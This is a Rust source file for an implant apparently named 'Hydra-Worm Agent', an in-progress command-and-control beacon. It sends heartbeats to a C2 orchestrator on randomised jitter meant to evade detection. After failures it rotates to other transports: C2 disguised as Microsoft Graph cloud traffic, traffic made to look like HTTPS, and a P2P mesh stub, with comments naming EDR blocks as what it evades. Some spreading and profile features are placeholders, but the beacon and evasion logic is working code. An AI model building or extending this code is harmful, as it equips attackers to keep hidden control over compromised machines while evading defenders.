// Project: Hydra-Worm Agent
// Phase: 1.3 - Orchestrator Integration
// Logic: Temporal Evasion + Multi-tier Mutation + Live C2 Telemetry

use std::thread;
use std::time::Duration;
use rand_distr::{Distribution, Exp};
use rand::thread_rng;
use serde::Serialize;

/// Data structure for C2 communication (Matches Go Orchestrator)
#[derive(Serialize)]
struct Telemetry {
    agent_id: String,
    transport: String,
    status: String,
    lambda: f64,
}

/// The core contract for all communication modules.
trait Transport {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<(), String>;
    fn get_name(&self) -> String;
}

// --- TRANSPORT TIER 1: CLOUD API ---
struct CloudTransport { endpoint: String }
impl Transport for CloudTransport {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<(), String> {
        println!("[!] C2-CLOUD: Attempting connection to {}...", self.endpoint);
        
        let client = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(5))
            .build()
            .map_err(|e| e.to_string())?;

        // In a real scenario, this would be the Cloud API URL
        // For local R&D, we point to our Go Orchestrator
        let url = "http://localhost:8080/api/v1/heartbeat";

        let res = client.post(url)
            .json(stats)
            .send()
            .map_err(|e| format!("Network Error: {}", e))?;

        if res.status().is_success() {
            Ok(())
        } else {
            Err(format!("HTTP Error: {}", res.status()))
        }
    }
    fn get_name(&self) -> String { "Cloud-API".into() }
}

// --- TRANSPORT TIER 2: MALLEABLE DIRECT ---
struct MalleableTransport { c2_ip: String }
impl Transport for MalleableTransport {
    fn send_heartbeat(&self, _stats: &Telemetry) -> Result<(), String> {
        println!("[!] C2-DIRECT: Mimicking HTTPS to {}...", self.c2_ip);
        // Placeholder for Phase 1.4: Malleable Profiles
        Err("TCP RST - EDR Block".into())
    }
    fn get_name(&self) -> String { "Malleable-Direct".into() }
}

// --- TRANSPORT TIER 3: P2P MESH ---
struct P2PTransport;
impl Transport for P2PTransport {
    fn send_heartbeat(&self, _stats: &Telemetry) -> Result<(), String> {
        println!("[!] C2-P2P: Broadcasting to local mesh...");
        // Placeholder for Phase 3.2: P2P Mesh
        Ok(())
    }
    fn get_name(&self) -> String { "P2P-Gossip-Mesh".into() }
}

// --- THE ENGINE ---
struct Agent {
    id: String,
    transport: Box<dyn Transport>,
    failures: u32,
    state: u8,
    lambda: f64,
}

impl Agent {
    fn new(id: &str) -> Self {
        Self {
            id: id.to_string(),
            transport: Box::new(CloudTransport { endpoint: "graph.microsoft.com".into() }),
            failures: 0,
            state: 0,
            lambda: 0.2, 
        }
    }

    fn get_next_sleep(&self) -> Duration {
        let exp = Exp::new(self.lambda).unwrap();
        let seconds = exp.sample(&mut thread_rng());
        let capped_seconds = seconds.min(60.0).max(1.0);
        
        println!("[?] Jitter Engine: λ={:.2} | Next heartbeat in {:.2}s", self.lambda, capped_seconds);
        Duration::from_secs_f64(capped_seconds)
    }

    fn run(&mut self) {
        loop {
            println!("\n[*] Strategy: {}", self.transport.get_name());
            
            let stats = Telemetry {
                agent_id: self.id.clone(),
                transport: self.transport.get_name(),
                status: "OK".into(),
                lambda: self.lambda,
            };

            match self.transport.send_heartbeat(&stats) {
                Ok(_) => {
                    println!("[+] Heartbeat Acknowledged by C2.");
                    self.failures = 0;
                },
                Err(e) => {
                    println!("[-] Failure: {}", e);
                    self.failures += 1;
                }
            }

            if self.failures >= 3 {
                self.mutate();
            }

            thread::sleep(self.get_next_sleep());
        }
    }

    fn mutate(&mut self) {
        self.state = (self.state + 1) % 3;
        self.failures = 0;
        println!("[!!!] ALERT: Triggering Transport Mutation...");

        self.lambda = match self.state {
            0 => 0.2,
            1 => 0.1,
            _ => 0.05,
        };

        self.transport = match self.state {
            0 => Box::new(CloudTransport { endpoint: "graph.microsoft.com".into() }),
            1 => Box::new(MalleableTransport { c2_ip: "192.168.1.50".into() }),
            _ => Box::new(P2PTransport),
        };
    }
}

fn display_splash() {
    let banner = r#"
            __                  __               
           / /_  __  ______  __/ /__________ _   
          / __ \/ / / / __ \/ __  / ___/ __ `/   
         / / / / /_/ / /_/ / /_/ / /  / /_/ /    
        /_/ /_/\__, / .___/\__,_/_/   \__,_/     
   _      ____/____/_/___  ____ ___              
  | | /| / / __ \/ __ \/ __ `__ \                
  | |/ |/ / /_/ / /_/ / / / / / /                
  |__/|__/\____/_/ .__/_/ /_/ /_/                 
                /_/                              
    "#;
    println!("{}", banner);
    println!("      [ Phase 1.3 - Orchestrator Integration Active ]\n");
}

fn main() {
    display_splash();
    let mut agent = Agent::new("HYDRA-TEST-01");
    agent.run();
}